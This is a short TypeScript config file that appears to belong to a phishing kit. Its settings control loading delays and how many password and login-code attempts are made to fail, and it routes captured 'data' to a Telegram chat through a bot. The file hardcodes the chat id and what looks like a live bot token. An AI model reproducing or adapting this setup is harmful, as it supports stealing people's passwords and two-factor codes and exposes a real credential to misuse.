interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 15000,
    max_failed_code_attempts: 2,
    max_failed_password_attempts: 1,
    password_loading_time: 10000,
  },
  telegram: {
    data_chatid: "-1002416068664",
    data_token: "7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
